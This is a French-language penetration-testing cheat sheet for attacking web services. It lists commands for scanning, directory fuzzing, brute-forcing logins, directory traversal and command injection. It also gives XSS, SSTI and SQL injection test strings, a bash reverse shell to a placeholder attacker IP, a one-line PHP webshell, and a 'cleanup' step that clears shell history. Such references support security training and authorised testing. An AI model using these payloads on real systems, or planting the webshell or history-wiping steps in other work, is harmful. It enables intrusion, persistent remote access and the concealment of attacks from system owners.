# 🌐 HTTP / HTTPS - Cheatsheet Cybersécurité

Ce fichier contient les commandes et outils pour **scanner**, **énumérer**, **attaquer**, **exfiltrer**, et **exploiter** des services web (HTTP/HTTPS).

---

## 🔍 1. Détection & Scan de services web

nmap -p 80,443 <IP>  
> Détection de ports HTTP(S)

nmap -p 80 --script http-title,http-methods,http-headers <IP>  
> Récupère titre de page, méthodes HTTP autorisées, headers

whatweb http://<IP>  
> Détection techno web (CMS, JS libs, versions...)

nikto -h http://<IP>  
> Scanner de vulnérabilités web (obsolète mais rapide)

---

## 📁 2. Enumération de répertoires & fichiers

gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
> Fuzz des dossiers avec Gobuster

ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt  
> Alternative rapide (fuzz des fichiers/dossiers)

dirsearch -u http://<IP>  
> Recherche automatique de répertoires et extensions

---

## 🧠 3. Interactions manuelles

curl -I http://<IP>  
> Affiche les headers HTTP (status, cookies, server...)

curl -X OPTIONS http://<IP> -v  
> Liste les méthodes HTTP supportées

curl -X PUT http://<IP>/test.txt --data 'test'  
> Test PUT si activé

curl -d "user=admin&pass=admin" -X POST http://<IP>/login  
> Envoie une requête POST (formulaire)

---

## 🪓 4. Vulnérabilités classiques HTTP

### 🔐 Authentification / Bruteforce

hydra -l admin -P rockyou.txt <IP> http-get /admin  
> Bruteforce HTTP GET simple

wfuzz -w wordlist.txt -u http://<IP>/login.php?user=FUZZ&pass=FUZZ  
> Bruteforce avec paramètres GET

### 🪟 Directory Traversal

curl http://<IP>/?file=../../../../windows/win.ini  
> Tentative de traversal

### 🐚 RCE via formulaire

curl -X POST -d 'ip=127.0.0.1;whoami' http://<IP>/ping  
> Injection de commande (si non filtrée)

---

## 🐞 5. Fuzzing et vulnérabilités Web

wfuzz -c -w wordlist.txt -u http://<IP>/FUZZ  
> Fuzz simple de répertoires

ffuf -u http://<IP>/FUZZ -w wordlist.txt -mc all  
> Fuzz avec retour sur tous les codes

---

## 🧪 6. Tests XSS / SSTI / SQLi manuels

### XSS

http://<IP>/search?q=<script>alert(1)</script>  
> Test simple

### SSTI (Python/Jinja2)

{{7*7}} ou {{config.items()}}  
> Injection de template

### SQLi

?id=1' OR '1'='1  
> Injection de base

---

## 🧬 7. Reverses shell Web

### Netcat webshell

bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1  
> Shell bash depuis un formulaire vulnérable

### PHP webshell

<?php system($_GET['cmd']); ?>  
> Upload ou injection possible dans un champ

---

## 🧱 8. Auth / Cookies / JWT

curl -b "session=abc123" http://<IP>  
> Utiliser un cookie dans curl

jwt_tool token.jwt -d  
> Décoder et bruteforcer un token JWT

Burp Suite  
> Intercepter, manipuler et répéter les requêtes (très utile)

---

## 🛠 9. Outils utiles pour HTTP

- `gobuster`, `dirsearch`, `ffuf` → Fuzzing répertoires  
- `curl`, `wget`, `httpie` → Requêtes manuelles  
- `nikto`, `whatweb`, `nmap` → Scan surface HTTP  
- `hydra`, `wfuzz`, `cewl` → Bruteforce / dictionnaires  
- `Burp Suite`, `ZAP`, `Postman` → Manipulation HTTP avancée  
- `jwt_tool`, `Corsy`, `httprobe`, `httpx`, `waybackurls` → Spécifique web

---

## 🧹 10. Nettoyage

history -c  
> Nettoyer historique bash

rm /var/www/html/shell.php  
> Supprimer les shells laissés

---

## 📚 11. Ressources utiles

- [PayloadsAllTheThings - Web](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Exploitation)
- [HackTricks - HTTP](https://book.hacktricks.xyz/pentesting-web/http-basics)
- [SecLists - Wordlists Web](https://github.com/danielmiessler/SecLists)
